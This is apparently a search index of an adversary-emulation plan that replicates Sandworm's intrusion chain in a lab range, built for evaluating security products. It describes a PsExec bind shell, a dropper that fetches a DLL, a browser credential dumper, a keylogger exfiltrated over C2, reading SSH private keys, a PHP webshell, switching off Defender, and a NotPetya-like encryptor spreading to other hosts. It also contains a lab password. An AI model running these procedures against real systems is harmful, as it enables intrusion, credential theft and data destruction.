for user fherbert only.","Source Code","Take a screenshot of the new implant session and paste it in Slack.","Terminate the PsExec.py session. Keep your terminal open.","The dropper will download Exaramel-Windows over HTTP. The dropper then executes the Exaramel-Windows (wsmprovav.dll) using rundll32.exe.","This will execute a Exaramel-Windows dropper on fherbert login.","Upload Exaramel-Windows-Dropper.exe to gammu/10.0.1.7 as C:\\Windows\\wsmprovav.exe.","Use psexec.py to gain a bind-shell to gammu/10.0.1.7 over SMB (TCP 445):","Whg42WbhhCE17FEzrqeJ","You will now RDP into gammu, role-playing as the legitimate fherbert user."]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html","https://securelist.com/be2-custom-plugins-router-abuse-and-target-profiles/67353/","https://blog.talosintelligence.com/2018/02/olympic-destroyer.html","https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/"]},{"i":"step-16---windows-discovery","l":"Step 16 - Windows Discovery","p":["\uD83C\uDFA4 voice track","Using the Exaramel-Windows C2 channel, Sandworm obtains the current username, OS version, performs a recursive file listing, and queries for RDP connections."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Place your cursor on the second pane in the control server window.","Run the following discovery commands:","Get current user.","Source Code","Get Windows version info.","List entire file system.","Look for RDP connections."]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.justice.gov/opa/press-release/file/1328521/download","https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/","https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/"]},{"i":"step-17---credential-dumping","l":"Step 17 - Credential Dumping","p":["\uD83C\uDFA4 voice track","During this step, Sandworm collects credentials.","Sandworm first uploads two files to disk:","oradump.exe is a variant of the open source tool, LaZagne. It has been refactored, some functionality removed, and compiled into a portable executable via PyInstaller.","mslog.exe is a keylogger that uses the SetWindowsHookEx function; mslog.exe writes a keystroke log file to C:\\Windows\\System32\\mslog.txt.","Sandworm obtains web browser credentials via oradump.exe.","Sandworm obtains domain admin credentials by keylogging an RDP session from a valid user.","Sandworm then gets a list of all domain hosts using dsquery."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â ï¸ Exaramel-Windows automatically RC4 encrypts the keylog file before exfiltration.","â ï¸ Go back to the gammu RDP session and sign out: Right-click Windows icon - Shut down or sign out - Sign out","â ï¸ Go back to your control server terminal.","â ï¸ oradump (LaZagne) can take several minutes to finish executing. Give it 5 minutes... if it hasn't returned by then, the vendor product probably broke it.","â ï¸ Switch to the gammu-RDP-session window.","Cleanup artifacts.","Confirm the keylogger actually logged keystrokes:","Confirm the keylogger log file exists:","Confirm you uploaded the keylog file; you should see an RC4 encrypted blob.","Enumerate all domain hosts (prep for notpetya deployment)","Execute the keylogger, logging keystrokes to mslog.txt.","Execute the webCredDumper; you should see credentials from Chromium.","Exfil the keylog file over the Exaramel-Windows C2 session (HTTPS).","Give arrakis a minute to load, then sign out of the RDP session: Right-click Windows icon - Shut down or sign out - Sign out","Keep the gammu RDP session open.","Keylogger Source Code","Modified LaZagne","Now we will exercise the keylogger.","Open the Windows RDP client on Gammu and manually type the following:","Source Code","Terminate the keylogger","Upload keylogger to gammu.","Upload the webCredDumper to gammu over Exaramel-Windows C2 channel (HTTPS / 192.168.0.4:443):","You must type this data manually to exercise the keylogger (caveat: if you fail to enter the password on the first try, just copy/paste it)."]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/","https://www.welivesecurity.com/2017/06/30/telebots-back-supply-chain-attacks-against-ukraine/"]},{"i":"step-18---pivot-to-dc","l":"Step 18 - Pivot to DC","p":["\uD83C\uDFA4 voice track","Sandworm logs into arrakis/10.0.1.4 over RDP using domain credentials (patreides).","Sandworm uploads a DLL based on NotPetya to arrakis (C:\\Windows\\perfc.dat) over a network share tunneled through the RDP connection."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â ï¸ go back to your first terminal window; rename to RDP into arrakis.","RDP into arrakis/domain controller using domain admin credentials.","Accept certificate warnings if prompted.","Once logged in, close server manager and any spurious warnings or pop-ups.","Open PowerShell as administrator (right click run as administrator yes):","Copy NotPetya from dungeon to arrakis over RDP channel:"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://www.justice.gov/opa/press-release/file/1328521/download","https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/","https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/"]},{"i":"step-19---deploy-notpetya","l":"Step 19 - Deploy NotPetya","p":["\uD83C\uDFA4 voice track","Sandworm executes NotPetya (perfc.dat) on arrakis / 10.0.1.4.","NotPetya creates a scheduled task called \"Restart\" that reboots the workstation and is executed at the end of the program.","NotPetya encrypts files under C:\\Users (recursive) via AES-128.","NotPetya drops a ransom note in C:\\README.txt.","NotPetya copies and executes itself on 10.0.1.8."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["Scenario complete.","Note: if you need to confirm encryption worked, do the following:","Open CMD, and cat this file:","If the file looks like encrypted binary, notPetya worked.","You may also run this command on Quadra to confirm lateral movement worked:","From DC PowerShell:"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html","https://www.us-cert.gov/ncas/alerts/TA17-181A","https://www.justice.gov/opa/press-release/file/1328521/download"]}],[{"l":"Scenario 1 Infrastructure","p":["We hope to capture the general structure of what is reported to have been seen being used by the Sandworm Team. Scenarios 1 and 2 share the same infrastructure; however, Scenario 1 was built to exercise detective-only security controls, and thus protective security controls are to be disabled to complete the evaluation. Scenario 2 was built to exercise protective security controls, which may be enabled while completing the evaluation.","The requirements described herein should be considered a bare minimum to execute the scenario. If you have the time and resources to remain true-to-form, you may elect to stand up multiple of each of these servers, non-contiguous IP space, etc. If you are not concerned with emulating the Sandworm Team to this degree, this level of effort is not necessary. You could for instance, phish, serve payload, and exfil from/to the same server."]},{"l":"Resources","p":["Please note that binary executable files hosted in Resources have been added to password protected zip files. The password for these files is \"malware.\"","We provide a script to automatically decrypt these files:","Note, there is no change of infrastructure between Scenario 1 and Scenario 2."]},{"l":"Emulation Team Infrastructure","p":["Linux Attack Platform: tested and executed on Kali Linux 2019.1","LaZagne","pyinstaller","Mimikatz","FreeRDP"]},{"l":"Emulation Team Infrastructure Configuration","p":["This methodology assumes the following static IP address configurations:","Red Team System","IP Address","Linux Attack Platform","192.168.0.4"]},{"l":"A note about red team payloads","p":["This evaluation utilizes a combination of modified open-source and custom utilities that are representative of NotPetya ransomeware.","These utilities include credential dumpers, variants of process injection techniques, and file encryption.","Some pre-compiled payloads are available in the resources directory; however, they are configured to connect back to static IP address 192.168.0.4."]},{"l":"Linux Attack Platform Setup","p":["Download the sandworm repository to the home directory"]},{"l":"Target Infrastructure","p":["4 targets, all domain joined:","Linux Server: tested and executed on CentOS 7.9","Domain Controller: tested and executed on Windows Server 2k19 - Build 17763","User machine 1: tested and executed on Windows 10 - Build 19042","User machine 2: tested and executed on Windows 10 - Build 19042"]},{"l":"Target Infrastructure Configuration","p":["Target System","Hostname","IP Address","Linux Server","caladan","10.0.1.5","Domain Controller","arrakis","10.0.1.4","User machine 1","gammu","10.0.1.7","User machine 2","quadra","10.0.1.8"]},{"l":"Linux Server Setup","p":["Upload caladan.sh to 10.0.1.5 via SCP","password: Whg42WbhhCE17FEzrqeJ","â ï¸ Run this command if you get SSH key errors","upload SUID binary to caladan","Run caladan.sh"]},{"l":"Domain Controller Setup","p":["RDP into arrakis:","Open Windows Defender, toggle all nobs to the off position.","Open PowerShell being sure to select \"Run as Administrator\":","Reboot"]},{"i":"gammu--10017-setup","l":"Gammu / 10.0.1.7 Setup","p":["RDP into Gammu:","Open Windows Defender, toggle all knobs to the off position.","Open PowerShell being sure to select Run as Administrator.","Open chromium and navigate to: https://www.stealmylogin.com/demo.html","Enter the following credentials; save / cache the credentials when prompted.","Double-check the credentials were cached by going to Chromium settings > passwords. You should have one entry for stealmylogin.com","Reboot Gammu:"]},{"i":"configure-quadra--10018","l":"Configure Quadra / 10.0.1.8","p":["RDP into quadra:","Open Windows Defender, toggle all knobs to the off position.","Open PowerShell being sure to select Run as Administrator:","Reboot"]},{"l":"Network Diagram","p":["A network diagram is available here that displays the domains and infrastructure that was used to support the setup and execution of the Emulation plan.","Infrastructure Image"]}],[{"l":"DEPENDENCIES"},{"l":"CALDERA C2 Server","p":["Linux/Mac OS, 64-bit","git commandline installed","python3.7+ with pip3","python3.9+ recommended","golang 1.17+","required for dynamic agent compilation"]},{"l":"Attacker Machine Dependencies","p":["Linux OS, 64-bit","Kali recommended","Can be the same machine as the CALDERA C2 server if needed.","command-line tools","sshpass","curl","smbclient","xfreerdp","xdotool"]},{"l":"Target Machine Dependencies","p":["For the Linux target machine, the user account used for initial access must be able to run sudo commands without entering a password."]},{"l":"SETUP"},{"l":"Download and Install CALDERA","p":["Run the following on a Linux/Mac machine of your choice. This machine will act as your C2 server.","Add the emu plugin add emu to your conf/local.yml configuration file. Feel free to enable or disable other plugins by adding/removing them from the configuration file. You can also configure your user accounts and credentials if needed.","Download pip dependencies.","Download required payloads for emu plugin.","Run your C2 server."]},{"l":"RUNNING THE OPERATION"},{"l":"Launch Agent on Attacker-controlled Kali Machine","p":["We recommend using a different Kali linux machine to run the Kali agent since RDP windows will need to be in the forefront when performing certain automated keystrokes. Thus, in order to avoid disrupting automated RDP keystrokes, it's best to run the Kali agent on a machine different from the C2 server. If you plan on using the same Kali machine to run the C2 server and the kali agent, make sure not to type or click around when performing RDP-related abilities.","Launch the agent by running the following command on the (preferably remote) Kali machine:","Log into CALDERA's web GUI by accessing your C2 server address in a web browser (Chrome recommended), and using your credentials (default username is red, default password is admin).","Make sure you can see your kali agent after clicking the agents option on the menu on the left, under \"Campaigns\".","For best results, make sure you don't have other agents currently beaconing in."]},{"l":"Fact Setup","p":["Before running the operation, you will need to make sure that the Sandworm fact source is properly configured for your environment. While default fact values are provided, they will need to be replaced by the appropriate values specific to your testing environment. On the left menu, under Configuration, select fact sources. Under the \"Select a source\" drop-down menu, select Sandworm Team (G0034) (Emu), which is the fact source for the Sandworm adversary. From there, update the following facts as needed:","initial.target.host: the IPv4 address or hostname of the initial target for the operation. This will have to be a Windows machine connected to your Active Directory environment.","initial.user.name: the username (without the domain portion) that will be used to log into the initial target.","initial.user.password: the password of the initial user.","second.target.host: the IPv4 address or hostname of the second target for the operation. This will have to be a Windows machine connected to your Active Directory environment.","second_host.user.name: the username (without the domain portion) that will be used to log into the second target.","second_host.user.password: the password of the second target user.","domain.admin.name: username (without the domain portion) of the domain admin.","domain.admin.password: domain admin's password.","dc.target.host: the IPv4 address or hostname of the Domain Controller for your AD environment."]},{"l":"Operation Setup","p":["Add in an appropriate name for your operation.","Adjust Jitter as needed if you want the operation steps to occur with greater or lesser frequency.","After adjusting the fact source as needed, select operations from the left menu, under \"Campaigns\".","For Auto-close, you can decide whether or not you want the operation to auto-terminate or stay open until someone terminates the operation.","For Autonomous, make sure \"Run Autonomously\" is selected.","For Group, make sure All Groups is selected.","For Run state, make sure \"Run immediately\" is selected.","For the adversary profile, select Sandworm Team (G0034).","For the Fact Source, select Sandworm Team (G0034).","For the Parser, select \"Do not user default parsers\".","For the Planner, select Sandworm Planner.","Keep visibility at 51.","Make sure the plain-text obfuscator is selected.","Select \"+ Create Operation\" to the right of the drop-down menu.","Select Advanced to expand the Advanced configurations.","When ready, hit the Start button and wait for your operation to complete."]},{"l":"TERMINATING THE OPERATION","p":["Press the stop button in the operation GUI to finish the operation and enter the cleanup stage.","After the cleanup phase finishes, terminate agents from the GUI, or RDP/SSH into the target machines to stop the agent processes."]},{"l":"Cleanup","p":["Note that when the operation terminates, the agents running on the various targets will perform various cleanup tasks in order to revert certain changes, such as file downloads and persistence. These are not part of the actual evaluation. The following cleanup actions are taken:- The agent running on the attacker-controlled Kali machine will SSH into the Linux target and run the following:- sudo rm -f /var/www/html/search.php- sudo rm -f /var/www/html/centreon_module_linux_app64- printf ps auxf | grep -i httpd\\nnetstat -antp | grep -i httpd\\n | sudo tee /var/www/html/include/tools/check.sh /dev/null- The agent running on the Linux target will run crontab -r to clear crontab persistence.- The agent running on the Linux target will run the following to clear systemd persistence: systemctl disable syslogd.service; systemctl stop syslogd.service; rm -f /etc/systemd/system/syslogd.service;- The agent on the attacker-controlled Kali machine will delete the wsmprovav.exe file and sw_tools directory from the current working dir.- The agent running on the first lateral movement Windows target will delete the dir.out file- If the agent is still running on the domain controller, it will delete the C:\\Windows\\perfc.dat and C:\\README.txt files and delete the Restart scheduled task","While the operation cleanup phase will cleanup the actions taken against the Linux target, there are still certain cleanup actions required after terminating the operation, as the operation cleanup phase does not include every host. Also, running the below cleanup actions will be required if certain commands fail during the oepration's cleanup phase or if the agents somehow lose connection to the C2 server prior to receiving cleanup commands.","terminate agents from the GUI, or RDP/SSH into the target machines to stop the agent processes","Follow the step described in cleanup","Change commands to use the IP addresses, user credentials, etc. from your environment as needed.","RDP into the domain controller and delete the agent executable at C:\\Windows\\system32\\perfc.exe"]},{"l":"Uploaded Files","p":["If all goes well during the operation, the agent running on the second target host (the first Windows target after the Linux target) will have uploaded two files: dir.out(output from the dir /s /b C:\\ command) and mslog.txt(logged keystrokes from the keylogger).","The directory on the CALDERA server machine that contains the uploaded files depends on the exfil_dir setting within the CALDERA configuration file (/tmp/caldera by default). Within this exfil directory, you'll find a subdirectory of the format hostname-agentidentifier, where hostname is the hostname where the agent was running, and the agent identifier is the unique identifier for the agent. The encrypted uploaded files will be in that subdirectory.","To decrypt the uploaded files, you can use the decryption utility provided in app/utility/file_decryptor.py within the CALDERA main directory. Run it and pass in the path to the CALDERA configuration file used (e.g. default.yml or local.yml) as well as the path to the input file and output file (change file paths in the example as needed)"]},{"i":"modificationsdeviations-from-the-original-emulation-plan","l":"MODIFICATIONS/DEVIATIONS FROM THE ORIGINAL EMULATION PLAN","p":["Note that CALDERA will be used as the control server instead of the control_server program used in evals. As such, the agent executables used will be specific to CALDERA and are not compatible with the original control server program, and vice versa.","Note that agent-server communication will be in unencrypted by default unless CALDERA is run using the ssl plugin and is listening on an HTTPS socket.","Note that the agents will connect to the C2 server using the pre-configured HTTP port from the CALDERA configuration file (default 8888), and so the port numbers may differ from what was used in evals.","When performing RDP connections with shared drives, some of the local file paths on the attacker machine are adjusted for more flexibility, since agents may be started from various directories on the local file system. The overall functionality remains the same."]},{"l":"Step 11","p":["sshpass is used to pass in the initial user's SSH credentials to scp and ssh in a programmatic way, without having to do so manually.","Because the payload file is downloaded to the attacker machine agent's current working directory, the file path used in the scp command for the webshell is ./obfuscated_webShell.php instead of sandworm/Resources/phpWebShell/obfuscated_webShell.php.","Cleanup for step 11 is included and is modified to run via sshpass and ssh:","If the automated cleanup for step 11 fails, please follow manual cleanup instructions from cleanup"]},{"l":"Step 12","p":["curl commands will have their stderr output suppressed to prevent CALDERA from prioritizing stderr output over stdout","Note that the ls webshell command output may take a very long time to render/load from the browser due to the output size."]},{"l":"Step 13","p":["The CALDERA agent executable will be downloaded as centreon_module_linux_app64 and will be used instead of the actual centreon_module_linux_app64 file used in evals.","The agent will act as the remote access implant and will replace the Exaramel-Linux-based malware from evals.","The curl request used to download the agent executable has been modified in order to perform an HTTP POST request and pass in required headers for compiling the agent executable. It will look something like the following:","An extra ability is included to wait for 40 seconds for the new elevated agent to start beaconing in to the C2 server."]},{"l":"Step 14","p":["The following command is run via sh to emulate the original GoLang implementation for cron persistence:","The following command is run via sh to emulate the original GoLang implementation for systemd persistence:","Instead of transferring the SSH key files directly to the CALDERA server, the agent will execute the following cat commands via sh and send the output to the CALDERA server: cat /home/fherbert/.ssh/id_rsa;cat /home/fherbert/.ssh/id_rsa.pub;"]},{"l":"Step 15","p":["The CALDERA agent executable for the lateral movement target will be compiled and downloaded as wsmprovav.exe and will be used instead of the actual wsmprovav.exe executable used in evals.","The agent will act as the remote access implant and will replace the Exaramel-based malware from evals.","Note that the agent executable will directly connect to the C2 server and does not act as a stager or dropper. No DLL will be downloaded or executed as part of this process.","When running the psexec python script, since the user's environment may not have the script pre-installed, or in a different directory, the user must download the script by executing the ./download_payloads.sh script prior to starting the CALDERA server. This will download the required psexec_sandworm.py script in the payloads directory within the emu plugin.","The commandline when running the psexec script has been modified to run without any manual user input, and may look something like the following:","Note that the commands for loading the registry hive and setting registry persistence are performed in a single cmd command.","Since the agent executable runs directly without acting as a stager or downloading further payloads, the commandline for the registry persistence has been condensed to simply run the wsmprovav.exe executable without any extra arguments. Also note that this will exclude rundll32.exe from the process tree.","An extra ability is included to wait for 40 seconds for the new agent to start beaconing in to the C2 server."]},{"l":"Step 16","p":["Instead of using GoLang to discover the current username, the CALDERA agent will run the whoami.exe executable.","Instead of using GoLang to query registry keys, the agent will run the following via cmd:","Instead of using GoLang to list files, the agent will run the following via cmd: dir /s /b C:\\ dir.out","Because of the large output and potential issues in rendering it on the screen, the output is saved to dir.out on the target machine, and this file is exfiltrated to the C2 server so that the operators still get the output in an efficient manner. dir.out will be deleted during cleanup.","netstat is executed via cmd /c rather than cmd /k"]},{"l":"Step 17","p":["The web credential dumper is initially saved to disk at the agent's current working directory as dumpWebBrowserCreds.exe, and is renamed and moved to C:\\Windows\\System32\\oradump.exe via cmd.","The web credential dumper is executed via cmd /c rather than cmd /k and has its stderr redirected to stdout due to how CALDERA handles stderr.","The keylogger is initially saved to disk at the agent's current working directory as keylogger.exe, and is renamed and moved to C:\\Windows\\System32\\mslog.exe via cmd.","Note that the keylogger is set to run for about 30 seconds, depending on how frequently the agents are beaconing in. This gives the operator a short window to type in keystrokes over the RDP window. If no keystrokes are entered, the mslog.txt file is not created.","When verifying the mslog.txt keylogger file, dir and type are executed via cmd /c rather than cmd /k","mslog.txt is uploaded to the CALDERA server via the C2 channel. Depending on the CALDERA server configuration, the location of the uploaded file may be something like /tmp/caldera/agent-identifier/mslog.txt, and the uploads are encrypted server-side.","taskkill, dsquery, and del are executed via cmd /c rather than cmd /k"]},{"l":"Step 18","p":["Prior to setting up the RDP connection, the agent on the attacker machine will set up a sw_tools directory from the current working directory. This directory will contain the SharpNP.dll DLL as well as another compiled agent binary named as perfc.exe","When performing the RDP connection, the RDP shared drive will reference the ./sw_tools local directory on the attacker's machine","Instead of typing out the remaining commands over the RDP connection, a new agent will be spawned by copying perfc.exe over the RDP shared drive and executing it in an administrator PowerShell session.","Note that while a malicious implant was not executed on the domain controller during evals, we will be executing a CALDERA agent in this version to handle commands and output in a more streamlined and stable manner.","The CALDERA agent running on the domain controller will spawn a separate PowerShell process to run the following:"]},{"l":"Step 19","p":["The CALDERA agent running on the domain controller will spawn a separate PowerShell process to run the following:"]}],[{"l":"Resources","p":["The Resources directory contains the following:","Source code used for the components of the emulated attack","Documentation on building source code and details on usage","Backend components such as the control server","Terraform and Ansible code for the environment setup","Each component has one or more additional documents specific to that resource."]},{"l":"Resources Index","p":["Exaramel-Windows-Dropper","README.md","Exaramel-Windows","Exaramel","NotPetya","browser-creds","cleanup","keylogger","phpWebShell","setup","suid-binary","utilities"]}],[{"l":"NotPetya","p":["This is a C# implementation of NotPetya's capabilities. For many of the TTPs, the same Windows API calls were made via p/invoke to match the CTI as closely as possible.","Note: In order to mitigate abuse, the encryption for impact functionality has been deliberately removed. Users wishing to emulate this behavior may reference threat intelligence sources to implement their own trusted encryption solution."]},{"l":"Build Instructions","p":["Open the command prompt (cmd.exe), navigate to directory containing the SharpNP Visual Studio solution file (SharpNP.sln), and run the devenv.exe command:","cd sandworm\\Resources\\SharpNP\"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\Common7\\IDE\\devenv.exe\" SharpNP.sln /build Release","The DLL will be found in the bin\\Release\\x64 folder (there will also be DLLs available in other folders).","Note: The final product is expected to be a DLL. If you see an executable (.exe), the project settings need to be adjusted by:","Open the project in Visual Studio","Open SharpNP properties (Click on Project menu and Select \"SharpNP Properties\")","On the Application tab, select \"Class Library\" in the \"Output Type\" section","Rebuild the solution"]},{"l":"Test Instructions","p":["Open PowerShell","np_test.ps1"]},{"l":"Usage Examples"},{"i":"execute-via-rundll-1--the-first-entrypoint-in-the-dll","l":"execute via rundll; #1 == the first entrypoint in the DLL"},{"i":"note-sharpnpdll-is-renamed-to-perfcdat","l":"Note: SharpNP.dll is renamed to perfc.dat","p":["C:\\Windows\\System32\\rundll32.exe perfc.dat,\"#1\""]},{"l":"Cleanup Instructions","p":["Open a command prompt or PowerShell","del perfc.dat del C:\\README.txt Unregister-ScheduledTask -TaskName Restart"]},{"l":"Misc","p":["Deviations from CTI:","The MBR and MFT are currently not encrypted","EternalBlue and EternalRomance exploits not used","PsExec is not used to propagate; only WMI is used","A scheduled task to reboot the host is not created","Some functions use the C# libraries to execute TTPs, so their underlying API calls and the artifacts left behind may differ including:","Encryption functions","Process execution"]},{"l":"CTI Evidence","p":["https://attack.mitre.org/software/S0368/ https://www.cynet.com/blog/technical-analysis-notpetya/ https://www.securityartwork.es/2017/07/07/the-mimi-mimikatz-side-of-notpetya/ https://www.crowdstrike.com/blog/petrwrap-ransomware-technical-analysis-triple-threat-file-encryption-mft-encryption-credential-theft/"]},{"l":"References","p":["https://blog.xpnsec.com/rundll32-your-dotnet/ https://docs.microsoft.com/en-us/visualstudio/ide/reference/build-devenv-exe?view=vs-2019"]}],[{"i":"net-dllexport","l":".NET DllExport","p":[".NET DllExport with .NET Core support (aka 3F/DllExport)","Build status Latest-Release License coreclr_ILAsm Cecil MvsSln GetNuTool hMSBuild Conari","Build history","DllExport-action Configure[?]","[Quick start] [Examples: C++, C#, Java]-> { Wiki} { \uD83E\uDDEA Demo src}","For work with Unmanaged memory including native or binary data from the heap and binding between .NET and unmanaged native C/C++ etc, use Conari","For related work with Lua (5.4, 5.3, 5.2, 5.1, ...), use LuNari","We're supporting the following PE modules: Library (.dll) and Executable (.exe) [?]"]},{"l":"License","p":["The MIT License (MIT)",".NET DllExport contributors: https://github.com/3F/DllExport/graphs/contributors"]},{"i":"_","l":"&_"},{"l":"How does it work","p":["Current features has been implemented through ILDasm& ILAsm that prepares the all required steps via .export directive ( it's specific directive for ILAsm compiler only).","What inside ? or how does work the .export directive ?","Read about format PE32/PE32+, start with grammar from asmparse and move to writer:","Read also my brief explanations here: AssemblyRef encoding/ about mscoree/ DllMain & the export-table/ DllExport.dll/ ordinals..."]},{"l":"How to get DllExport","p":["tl;dr: put this inside solution folder, then click it there.","Since v1.6+ have no official support of NuGet clients ([?]), you need just use this inside your solution folder. Wiki:[Quick start]","Get our manager (~ 20 Kbytes) from any trusted place. Official GHR is recommended. But you can also get it from official packages via NuGet server NuGet package, etc. [Documentation]"]},{"l":"How to Build .NET DllExport","p":["Just use build.bat if you need final binaries (NuGet package as DllExport.version.nupkg, Manager, zip-archives, and others).","Part of the build works through vssbe(including CI that uses CIM version). But you don't need to do anything at all. For Visual Studio IDE you can also use vsix version"]},{"i":"modified-ilasm--ildasm-on-coreclr","l":"Modified ILAsm + ILDasm on coreclr","p":["We're using our modified versions on coreclr specially for our .NET DllExport project - https://github.com/3F/coreclr","This helps to avoid some problems ( like this, or this) and more...","To build minimal version (it will not include all components as for original coreclr repo):","Restore git submodule or use repo: https://github.com/3F/coreclr.git","Make sure that you have installed CMake, then build simply:","You can also use our compiled versions: NuGet package"]},{"l":"Donation","p":["Please note again, the UnmanagedExports was created by Robert Giesecke. His page is here. [?]","But .NET DllExport is not related to him.","â .NET DllExport is developed for you by GitHub/3F([GitHub]; [twitter]).","If something is helpful from 3F/DllExport, donations are welcomed, and thanks !","[â Donate]"]}],[{"i":"net-core-clr-coreclr","l":".NET Core CLR (CoreCLR)","p":["Contains the complete runtime implementation for .NET Core. It includes RyuJIT, the .NET GC, native interop and many other components.","Modified and has been prepared specialy for https://github.com/3F/DllExport by GitHub/3F developer."]},{"i":"-license","l":"â License","p":[".NET Core (including the coreclr repo) is licensed under the MIT License (MIT)."]},{"l":"CoreCLR IL Assembler","p":["ILAsm & ILDasm","CI","Win.x86-x64.Release","Build status","release License NuGet package","Download:/releases[latest]","IL Assembler (ILAsm) + IL Disassembler (ILDasm)","Custom version on .NET Core CLR (CoreCLR) 3.0: https://github.com/3F/coreclr","Specially for: https://github.com/3F/DllExport","! To provide compatible converter of resources to obj COFF-format when assembling with ILAsm, use /CVRES (/CVR) key.","Related issue: https://github.com/3F/coreclr/issues/2"]},{"l":"NuGet Packages","p":["Custom use via GetNuTool","gnt/p:ngpackages=ILAsm[?]","PDB files (240 MB+) are available through GitHub Releases: https://github.com/3F/coreclr/releases","Additional MSBuild Properties:","$(ILAsm_RootPkg)- path to root folder of this package after install.","$(ILAsm_PathToBin)- path to \\bin folder., eg.: $(ILAsm_PathToBin)Win.x64\\ilasm.exe"]}],[{"l":"Browser Credential Dumper","p":["This repo contains a modified version of the LaZagne project. LaZagne contains functionality for dumping credentials from a variety of sources on various operating systems. However, the code contained here is a shrunken down version that is limited to only dumping credentials from browsers on Windows machines."]},{"l":"Usage","p":["This directory contains lazagne.exe, which is a portable executable that has been tested on Windows 10 machines. To use this executable, simply drop it on the target system and execute from a command prompt."]},{"l":"Build Instructions","p":["If you would like to build the executable yourself, there are several tools that compile Python code into Windows Executables. The Evals team used PyInstaller to generate a portable single file executable.","Compile the code using PyInstaller on Windows:","Install PyInstaller:","Navigate to the Windows directory within this repo:","Compile using the following command:","The executable will be found in Windows\\dist\\ as lazagne.exe.","Note: PyInstaller needs to compile all dependencies into the single executable, and does so by examining imports. However, LaZagne dynamically loads many of its modules at runtime, and so PyInstaller is unaware of those dependencies. The compilation command explicitly informs PyInstaller to compile those dependencies as well with the --hidden-import option."]},{"l":"CTI Evidence","p":["https://www.welivesecurity.com/2016/12/13/rise-telebots-analyzing-disruptive-killdisk-attacks/"]}],[{"l":"Exaramel","p":["Exaramel is a Remote Access Tool known to be used by Sandworm to achieve C2 over HTTPS with their target systems. There exist versions for both Linux and Windows. While Go is a language that enables cross-compilation, the Linux and Windows specimens that were discovered and analyzed presented many differences in how they functioned. As a result, for the purposes of this evaluation, the code base for Exaramel has been split into two.","Exaramel for Linux provides basic RAT functionality. Specifically, it provides command execution and file upload and download capabilities. On startup, it creates a named UNIX domain socket which is used to ensure that it is the only instance of Exaramel running on the system. If a configuration file does not exist, it then writes one with default values. Lastly, Exaramel is supposed to automatically establish persistence, either through a user crontab or by writing a systemd service. However, for this evaluation, we have changed persistence to be established on demand, only when the RAT receives the specific command from the C2 server."]},{"l":"Quick Start"},{"l":"Build Instructions","p":["Use the 'make' utility as follows:"]},{"l":"Test Instructions"},{"l":"Usage Examples"},{"l":"Linux","p":["Execute the agent:","Commands to receive from the server:","Provide a command to the C2 Server:"]},{"l":"Cleanup Instructions","p":["Kill the Exaramel process and delete its binary from disk:","Delete persistence:"]},{"l":"CTI Evidence","p":["https://www.welivesecurity.com/2018/10/11/new-telebots-backdoor-linking-industroyer-notpetya/","https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"]}],[{"l":"Exaramel for Windows","p":["What is the purpose of this binary? How does it work? What does it do?"]},{"l":"Quick Start"},{"l":"Build Instructions","p":["Run make.bat on Windows.","It will output \"Exaramel-Windows.dll\" in the Exaramel-Windows folder."]},{"l":"Test Instructions"},{"l":"Usage Examples"},{"l":"Cleanup Instructions"},{"l":"CTI Evidence","p":["TBD"]}],[{"l":"Exaramel Windows Dropper","p":["This program is used in step5 of the sandworm scenario to download and execute Exaramel-Windows.dll.","This program is executed on target via PsExec.py.","This program then downloads the DLL via HTTP and URLDownloadToFile.","The downloaded DLL is then executed via the C standard library:"]},{"l":"Quick Start","p":["Execute this program on Windows:","Note: This program does not work with self-signed certificates unless you import the certificate on the target system first."]},{"l":"Build Instructions","p":["Download and install a C++ compiler: https://jmeubank.github.io/tdm-gcc/download/","Run the make.bat script from a terminal (cmd.exe):","You should have 'Exaramel-Windows-Dropper.exe' in the current working directory."]},{"l":"Cleanup Instructions","p":["Delete Exaramel-Windows-Dropper.exe and any downloaded files.","Reboot the system to flush any DLL's from process memory."]},{"l":"CTI Evidence","p":["Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe.","https://www.welivesecurity.com/2017/07/04/analysis-of-telebots-cunning-backdoor/"]}],[{"l":"PHP WebShell","p":["This folder contains a simple PHP webshell that emulates a subset of behaviors of the P.A.S. webshell used by Sandworm Team:"]},{"l":"Quick Start","p":["Read the source code for webShell.php and obfuscated_webShell.php- don't worry, its short.","Copy obfuscated_webShell.php to a web server directory on the target system. This example shows how to do so on a default Apache installation:","Start the web server if its not already running","Issue commands using a web browser or HTTP client:"]},{"l":"Test Instructions","p":["Run this Python script:"]},{"l":"Cleanup Instructions","p":["Delete the webshell from the target file system:"]},{"l":"Misc","p":["The PHP source code was taken from Kali Linux at:","Credit the original author: DK, http://michaeldaw.org, 2006 (note: dead hyperlink)","The obfuscated_webShell.php was obfuscated using an online PHP obfuscator ( https://www.gaijin.at/en/tools/php-obfuscator)."]},{"l":"CTI Evidence","p":["https://attack.mitre.org/groups/G0034/ https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"]},{"l":"References","p":["https://tools.kali.org/maintaining-access/webshells https://www.gaijin.at/en/tools/php-obfuscator"]}],[{"l":"Sandworm Range Setup Instructions"},{"i":"configure-dungeon---19216804","l":"Configure dungeon - 192.168.0.4","p":["Clone sandworm repo to home directory","Enter your credentials when prompted.","Stage the file generator for later user:","Install terminator:","If you are prompted to 